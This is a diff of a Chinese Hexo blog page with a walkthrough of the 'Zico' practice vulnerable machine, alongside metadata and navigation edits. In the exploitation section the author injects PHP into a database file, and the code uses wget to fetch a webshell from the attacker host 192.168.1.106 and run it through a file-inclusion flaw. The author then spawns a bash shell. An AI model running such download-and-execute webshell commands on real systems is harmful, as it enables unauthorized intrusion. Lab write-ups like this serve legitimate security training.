@@ -865,12 +865,12 @@
                                 <span class="chip bg-color">渗透测试</span>
                             </a>
                         
-                            <a href="/tags/提权/" target="_blank">
-                                <span class="chip bg-color">提权</span>
-                            </a>
-                        
                             <a href="/tags/内网渗透/" target="_blank">
                                 <span class="chip bg-color">内网渗透</span>
+                            </a>
+                        
+                            <a href="/tags/提权/" target="_blank">
+                                <span class="chip bg-color">提权</span>
                             </a>
                         
                             <a href="/tags/靶机渗透/" target="_blank">
@@ -897,7 +897,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-02-18
+                    2021-04-06
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -911,7 +911,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        596
+                        595
                     </div>
                     
 
@@ -953,7 +953,7 @@
 </ul>
 <p>这是zico的密码：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221174739422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分别SSH登录一下<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221174938160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里都失败了，给了两个假密码，那就只能数据库插马提权了。</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先数据库插一句phpinfo试一下效果，看看能不能包含出来。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221191215608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221191318617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里成功验证了文件包含漏洞，接着我们开启apache服务。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221193304541.png" alt="在这里插入图片描述"><br>把kali中自带的webshell拷贝到桌面并改名为shell.php备用。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221194242339.png" alt="在这里插入图片描述">然后去数据库管理界面<br>新建一个名为shell.php的数据库<br>新建一张shell表<br>字段内容为：</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">"cd /tmp;wget http://192.168.1.106/shell.php;chmod +x shell.php;php shell.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">"cd /tmp;wget http://192.168.1.106/shell.php;chmod +x shell.php;php shell.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这段php代码的意思是，从我们的攻击机下载shell.php到tmp目录并执行它。现在我们在靶机上开启监听，等待靶机执行webshell。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221200533422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="获得权限"><a href="#获得权限" class="headerlink" title="获得权限"></a>获得权限</h3><p>在靶机上找到之前可以远程包含的页面，访问新增加的php代码。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221200902387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功获得权限，这里我们优化一下界面</p>
 <pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1482,17 +1482,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/df372537.html">
+                <a href="/posts/f882b92c.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/10.jpg" class="responsive-img" alt="靶机渗透——Mr.Robot">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/09.jpg" class="responsive-img" alt="靶机渗透——Zico">
                         
-                        <span class="card-title">靶机渗透——Mr.Robot</span>
+                        <span class="card-title">靶机渗透——Zico</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1502,9 +1503,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-02-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-04-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -1517,6 +1518,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1524,12 +1526,12 @@
                         <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/提权/" target="_blank">
-                        <span class="chip bg-color">提权</span>
-                    </a>
-                    
                     <a href="/tags/内网渗透/" target="_blank">
                         <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                    <a href="/tags/提权/" target="_blank">
+                        <span class="chip bg-color">提权</span>
                     </a>
                     
                     <a href="/tags/靶机渗透/" target="_blank">
@@ -1547,24 +1549,24 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/d3a7d8d7.html">
+                <a href="/posts/df372537.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/05.jpg" class="responsive-img" alt="震网三代漏洞复现（CVE-2017-8464）">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/10.jpg" class="responsive-img" alt="靶机渗透——Mr.Robot">
                         
-                        <span class="card-title">震网三代漏洞复现（CVE-2017-8464）</span>
+                        <span class="card-title">靶机渗透——Mr.Robot</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            CVE-2017-8464 漏洞复现
+                            靶机渗透实战，火速围观！
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-02-18
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-04-06
                             </span>
                         <span class="publish-author">
                             
@@ -1581,20 +1583,20 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞复现/" target="_blank">
-                        <span class="chip bg-color">漏洞复现</span>
-                    </a>
-                    
                     <a href="/tags/渗透测试/" target="_blank">
                         <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/内网渗透/" target="_blank">
+                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
                     <a href="/tags/提权/" target="_blank">
                         <span class="chip bg-color">提权</span>
                     </a>
                     
-                    <a href="/tags/Windows/" target="_blank">
-                        <span class="chip bg-color">Windows</span>
+                    <a href="/tags/靶机渗透/" target="_blank">
+                        <span class="chip bg-color">靶机渗透</span>
                     </a>
                     
                 </div>
@@ -1771,7 +1773,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
     <div class="container row center-align">
         <div class="col s12 m8 l8 copy-right">
             
-            Copyright&copy; 2019 luckyzmj.cn
+            Copyright&copy; 2021 biadu.cn
             <!-- 备案信息配置
             Copyright&copy; 2019 luckyzmj.cn | <a href="http://www.beian.miit.gov.cn/">备案</a>
             <br>
@@ -1800,7 +1802,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">101.1k</span> 字
+                <span class="white-color">99.4k</span> 字
             
 
             
@@ -2004,8 +2006,8 @@ $(function () {
       app_id: "XXXXX"
     });
   daovoice('update');
-  </script>
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
         
 
-    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --><script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>
 </html>
